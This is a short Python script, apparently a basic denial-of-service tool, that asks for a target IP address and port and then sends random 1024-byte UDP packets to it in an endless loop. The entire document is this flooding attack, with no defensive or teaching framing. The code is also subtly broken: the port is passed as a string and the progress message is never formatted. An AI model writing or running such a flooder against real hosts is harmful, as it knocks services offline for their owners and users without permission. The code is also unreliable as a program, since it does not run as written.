import socket
import random

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1024)
ip = input("Enter the target ip: ")
port = input("Enter the port: ")

sent = 0
while 1:
    sock.sendto(bytes,(ip,port))
    print("Sent %s amount of packets to %s at port %s", sent, ip,port)
    sent = sent + 1